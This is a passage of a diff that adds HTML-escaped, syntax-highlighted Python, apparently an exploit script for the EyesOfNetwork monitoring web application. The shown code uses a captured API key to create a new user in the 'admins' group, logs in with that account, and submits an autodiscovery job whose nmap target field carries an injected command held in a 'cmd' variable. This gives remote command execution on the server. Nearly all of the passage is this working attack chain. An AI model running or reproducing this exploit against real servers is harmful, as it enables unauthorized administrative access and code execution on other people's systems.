+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Adding new administrator&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/eonapi/createEonUser?username=admin&amp;amp;apiKey=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EONAPI_KEY&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;user_name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;new_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;user_group&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;admins&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;user_password&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;new_pass&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;SUCCESS&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt;  &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ID = &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_success&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;New user &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; successfully created. ID:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; already exist.&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt;  &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_warn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The user &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; already exists&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;An error occured while querying the API. Unexpected description message: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;            &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;An error occured while querying the API. Unepected result code. Description: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;An error occured while querying the API. Missing result value in JSON response or unexpected HTTP status response&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Authentication with our new user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/login.php&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;auth_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;login=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;new_user&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;amp;mdp=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;new_pass&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;auth_req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;auth_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;auth_req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Set-Cookie&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;auth_req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_success&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Successfully authenticated&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Error while authenticating. We expect to receive Set-Cookie headers uppon successful authentication&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Creating AutoDiscovery job&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/lilac/autodiscovery.php&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;job_command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;request=autodiscover&amp;amp;job_name=Internal+discovery&amp;amp;job_description=Internal+EON+discovery+procedure.&amp;amp;nmap_binary=&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;usr&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;bin&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;nmap&amp;amp;default_template=&amp;amp;target%5B2%5D=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;auth_req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;job_command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Starting...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
